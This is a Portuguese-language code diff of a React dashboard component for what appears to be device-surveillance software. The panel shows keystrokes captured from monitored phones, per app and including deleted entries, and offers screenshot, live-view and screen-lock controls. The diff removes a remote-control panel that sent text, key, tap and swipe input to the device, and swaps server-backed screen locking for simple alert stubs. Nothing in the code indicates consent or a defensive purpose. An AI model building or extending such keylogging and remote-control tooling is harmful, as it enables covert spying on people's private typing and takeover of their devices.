@@ -5,7 +5,6 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import LockedScreen from "@/components/LockedScreen";
 import PhoneFrame from "@/components/PhoneFrame";
 import { trpc } from "@/lib/trpc";
-import { useToast } from "@/hooks/use-toast";
 
 interface DeviceDetailsProps {
   deviceId: string;
@@ -23,17 +22,6 @@ export default function DeviceDetails({
   const [isControlActive, setIsControlActive] = useState(false);
   const [isScreenLocked, setIsScreenLocked] = useState(false);
   const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
-  const [lockPassword, setLockPassword] = useState<string>("");
-  const [lockReason, setLockReason] = useState<string>("Dispositivo travado pelo administrador");
-  const [isLocking, setIsLocking] = useState(false);
-  
-  // ✅ NOVO: Estados para Controle Remoto
-  const [remoteInputText, setRemoteInputText] = useState<string>("");
-  const [remoteInputType, setRemoteInputType] = useState<"text" | "key" | "tap" | "swipe">("text");
-  const [isSendingCommand, setIsSendingCommand] = useState(false);
-  const [remoteCommandHistory, setRemoteCommandHistory] = useState<any[]>([]);
-  
-  const { toast } = useToast();
 
   // Fetch keylogs from backend
   const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
@@ -44,18 +32,6 @@ export default function DeviceDetails({
   // Fetch deleted keylogs from backend
   const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
     { deviceId }
-  );
-
-  // ✅ NOVO: Fetch screen lock status
-  const { data: screenLockStatus, refetch: refetchLockStatus } = trpc.screenLockAdvanced.status.useQuery(
-    { deviceId },
-    { refetchInterval: 3000 } // Atualizar a cada 3 segundos
-  );
-
-  // ✅ NOVO: Fetch remote control history
-  const { data: remoteHistory = [], refetch: refetchRemoteHistory } = trpc.remoteControl.history.useQuery(
-    { deviceId: parseInt(deviceId), limit: 50 },
-    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
   );
 
   // Mutations
@@ -74,166 +50,37 @@ export default function DeviceDetails({
     },
   });
 
-  // ✅ NOVO: Mutation para ativar travamento
-  const activateLockMutation = trpc.screenLockAdvanced.activate.useMutation({
-    onSuccess: () => {
-      setIsScreenLocked(true);
-      refetchLockStatus();
-      toast({
-        title: "✅ Sucesso",
-        description: "Tela travada com sucesso!",
-        variant: "default",
-      });
-    },
-    onError: (error) => {
-      toast({
-        title: "❌ Erro",
-        description: `Erro ao travar: ${error.message}`,
-        variant: "destructive",
-      });
-    },
-  });
-
-  // ✅ NOVO: Mutation para desativar travamento
-  const deactivateLockMutation = trpc.screenLockAdvanced.deactivate.useMutation({
-    onSuccess: () => {
-      setIsScreenLocked(false);
-      refetchLockStatus();
-      toast({
-        title: "✅ Sucesso",
-        description: "Tela desbloqueada com sucesso!",
-        variant: "default",
-      });
-    },
-    onError: (error) => {
-      toast({
-        title: "❌ Erro",
-        description: `Erro ao desbloquear: ${error.message}`,
-        variant: "destructive",
-      });
-    },
-  });
-
-  // ✅ NOVO: Mutation para enviar comando remoto
-  const sendRemoteCommandMutation = trpc.remoteControl.sendInput.useMutation({
-    onSuccess: (data) => {
-      toast({
-        title: "✅ Comando Enviado",
-        description: `Comando ${remoteInputType} enviado com sucesso!`,
-        variant: "default",
-      });
-      setRemoteInputText("");
-      refetchRemoteHistory();
-    },
-    onError: (error) => {
-      toast({
-        title: "❌ Erro",
-        description: `Erro ao enviar comando: ${error.message}`,
-        variant: "destructive",
-      });
-    },
-  });
-
   const handleScreenshot = () => {
-    toast({
-      title: "📸 Screenshot",
-      description: `Screenshot capturado de ${deviceName}`,
-    });
+    alert(`📸 Screenshot capturado de ${deviceName}`);
   };
 
   const handleStopLive = () => {
     setIsLiveActive(false);
-    toast({
-      title: "⏹️ Parado",
-      description: "Visualização ao vivo parada",
-    });
+    alert("⏹️ Visualização ao vivo parada");
   };
 
   const handleActivateControl = () => {
     setIsControlActive(!isControlActive);
-    toast({
-      title: isControlActive ? "🎮 Desativado" : "🎮 Ativado",
-      description: isControlActive
-        ? "Controle remoto desativado"
-        : "Controle remoto ativado",
-    });
+    alert(
+      isControlActive
+        ? "🎮 Controle desativado"
+        : "🎮 Controle remoto ativado"
+    );
   };
 
-  // ✅ CORRIGIDO: Usar mutation para travar
-  const handleLockScreen = async () => {
-    if (isLocking) return;
-    
-    setIsLocking(true);
-    try {
-      await activateLockMutation.mutateAsync({
-        deviceId: parseInt(deviceId),
-        password: lockPassword || "default_password",
-        reason: lockReason,
-      });
-    } catch (error) {
-      console.error("Erro ao travar:", error);
-    } finally {
-      setIsLocking(false);
-    }
+  const handleLockScreen = () => {
+    setIsScreenLocked(true);
+    alert("🔒 Tela travada! Digite a senha para destravar.");
   };
 
-  // ✅ CORRIGIDO: Usar mutation para destravar
-  const handleUnlockScreen = async () => {
-    if (isLocking) return;
-    
-    setIsLocking(true);
-    try {
-      await deactivateLockMutation.mutateAsync({
-        deviceId: parseInt(deviceId),
-      });
-    } catch (error) {
-      console.error("Erro ao destravar:", error);
-    } finally {
-      setIsLocking(false);
-    }
-  };
-
-  // ✅ NOVO: Enviar comando remoto
-  const handleSendRemoteCommand = async () => {
-    if (!remoteInputText.trim()) {
-      toast({
-        title: "⚠️ Aviso",
-        description: "Digite algo para enviar",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    if (isSendingCommand) return;
-
-    setIsSendingCommand(true);
-    try {
-      await sendRemoteCommandMutation.mutateAsync({
-        deviceId: parseInt(deviceId),
-        inputType: remoteInputType,
-        value: remoteInputText,
-      });
-    } catch (error) {
-      console.error("Erro ao enviar comando:", error);
-    } finally {
-      setIsSendingCommand(false);
-    }
-  };
-
-  // ✅ NOVO: Enviar comando com Enter
-  const handleKeyPress = (e: React.KeyboardEvent) => {
-    if (e.key === "Enter" && !e.shiftKey) {
-      e.preventDefault();
-      handleSendRemoteCommand();
-    }
+  const handleUnlockScreen = () => {
+    setIsScreenLocked(false);
+    alert("🔓 Tela desbloqueada com sucesso!");
   };
 
   const handleRemoveDevice = () => {
     if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
-      toast({
-        title: "❌ Removido",
-        description: `Dispositivo ${deviceName} removido com sucesso`,
-      });
+      alert(`❌ Dispositivo ${deviceName} removido com sucesso`);
       onBack();
     }
   };
@@ -250,11 +97,7 @@ export default function DeviceDetails({
 
   const handleRemoveSelectedKeylogs = () => {
     if (selectedKeylogs.size === 0) {
-      toast({
-        title: "⚠️ Aviso",
-        description: "Selecione pelo menos um keylog para remover",
-        variant: "destructive",
-      });
+      alert("Selecione pelo menos um keylog para remover");
       return;
     }
     selectedKeylogs.forEach((id) => {
@@ -300,25 +143,6 @@ export default function DeviceDetails({
         </h1>
       </div>
 
-      {/* ✅ NOVO: Status de Travamento */}
-      {screenLockStatus && screenLockStatus.isLocked && (
-        <Card className="bg-red-900 border-red-700 p-4">
-          <div className="flex items-center justify-between">
-            <div>
-              <p className="text-red-400 font-bold">🔒 Dispositivo Travado</p>
-              <p className="text-red-300 text-sm">{screenLockStatus.reason}</p>
-            </div>
-            <Button
-              onClick={handleUnlockScreen}
-              disabled={isLocking}
-              className="bg-green-600 hover:bg-green-700 text-white"
-            >
-              🔓 Destravar Agora
-            </Button>
-          </div>
-        </Card>
-      )}
-
       {/* Action Buttons */}
       <div className="flex flex-wrap gap-3">
         <Button
@@ -335,20 +159,15 @@ export default function DeviceDetails({
         </Button>
         <Button
           onClick={handleActivateControl}
-          className={`text-white ${
-            isControlActive
-              ? "bg-green-600 hover:bg-green-700"
-              : "bg-blue-600 hover:bg-blue-700"
-          }`}
+          className="bg-blue-600 hover:bg-blue-700 text-white"
         >
-          🎮 {isControlActive ? "Controle Ativo" : "Ativar Controle"}
+          🎮 Ativar Controle
         </Button>
         <Button
           onClick={handleLockScreen}
-          disabled={isLocking}
-          className="bg-orange-600 hover:bg-orange-700 text-white disabled:opacity-50"
+          className="bg-orange-600 hover:bg-orange-700 text-white"
         >
-          {isLocking ? "⏳ Travando..." : "🚫 Travar Tela"}
+          🚫 Travar Tela
         </Button>
         <Button
           onClick={handleRemoveDevice}
@@ -358,77 +177,9 @@ export default function DeviceDetails({
         </Button>
       </div>
 
-      {/* ✅ NOVO: Painel de Controle Remoto */}
-      {isControlActive && (
-        <Card className="bg-slate-800 border-slate-700 p-6 border-2 border-green-500">
-          <h3 className="text-green-400 font-bold mb-4">🎮 Painel de Controle Remoto</h3>
-          <div className="space-y-4">
-            <div>
-              <label className="text-slate-300 text-sm">Tipo de Comando</label>
-              <select
-                value={remoteInputType}
-                onChange={(e) => setRemoteInputType(e.target.value as any)}
-                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300"
-              >
-                <option value="text">📝 Texto</option>
-                <option value="key">⌨️ Tecla</option>
-                <option value="tap">👆 Toque</option>
-                <option value="swipe">👈 Deslizar</option>
-              </select>
-            </div>
-            <div>
-              <label className="text-slate-300 text-sm">Comando</label>
-              <textarea
-                value={remoteInputText}
-                onChange={(e) => setRemoteInputText(e.target.value)}
-                onKeyPress={handleKeyPress}
-                placeholder="Digite o comando aqui... (Enter para enviar)"
-                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500 resize-none h-20"
-              />
-            </div>
-            <Button
-              onClick={handleSendRemoteCommand}
-              disabled={isSendingCommand || !remoteInputText.trim()}
-              className="w-full bg-green-600 hover:bg-green-700 text-white disabled:opacity-50"
-            >
-              {isSendingCommand ? "⏳ Enviando..." : "✈️ Enviar Comando"}
-            </Button>
-          </div>
-        </Card>
-      )}
-
-      {/* ✅ NOVO: Configurações de Travamento */}
-      {!isScreenLocked && (
-        <Card className="bg-slate-800 border-slate-700 p-6">
-          <h3 className="text-cyan-400 font-bold mb-4">🔐 Configurações de Travamento</h3>
-          <div className="space-y-4">
-            <div>
-              <label className="text-slate-300 text-sm">Senha de Desbloqueio (opcional)</label>
-              <input
-                type="password"
-                value={lockPassword}
-                onChange={(e) => setLockPassword(e.target.value)}
-                placeholder="Digite uma senha para destravar"
-                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
-              />
-            </div>
-            <div>
-              <label className="text-slate-300 text-sm">Motivo do Travamento</label>
-              <input
-                type="text"
-                value={lockReason}
-                onChange={(e) => setLockReason(e.target.value)}
-                placeholder="Ex: Dispositivo travado pelo administrador"
-                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
-              />
-            </div>
-          </div>
-        </Card>
-      )}
-
       {/* Tabs */}
       <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
-        <TabsList className="grid w-full grid-cols-6 bg-slate-900 border border-slate-700">
+        <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
           <TabsTrigger
             value="info"
             className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
@@ -452,12 +203,6 @@ export default function DeviceDetails({
             className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
           >
             ⌨️ Keylogs
-          </TabsTrigger>
-          <TabsTrigger
-            value="remote"
-            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
-          >
-            🎮 Controle
           </TabsTrigger>
           <TabsTrigger
             value="history"
@@ -619,35 +364,6 @@ export default function DeviceDetails({
                         <span className="text-cyan-400">{log.appName}</span>: {log.keyText}
                       </p>
                       <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
-                    </div>
-                  </div>
-                ))}
-              </div>
-            )}
-          </Card>
-        </TabsContent>
-
-        {/* ✅ NOVO: Aba: Controle Remoto */}
-        <TabsContent value="remote" className="space-y-4">
-          <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">🎮 Histórico de Comandos Remotos ({remoteHistory.length})</h3>
-            {remoteHistory.length === 0 ? (
-              <p className="text-slate-400 text-center py-8">Nenhum comando enviado</p>
-            ) : (
-              <div className="space-y-2 max-h-96 overflow-y-auto">
-                {remoteHistory.map((cmd, idx) => (
-                  <div
-                    key={idx}
-                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-green-500 transition"
-                  >
-                    <div className="flex-1">
-                      <p className="text-slate-300">
-                        <span className="text-green-400">{cmd.inputType}</span>: {cmd.value}
-                      </p>
-                      <p className="text-slate-500 text-xs">
-                        Status: <span className={cmd.status === "completed" ? "text-green-400" : "text-yellow-400"}>{cmd.status}</span>
-                      </p>
-                      <p className="text-slate-500 text-xs">{formatTime(cmd.createdAt)}</p>
                     </div>
                   </div>
                 ))}
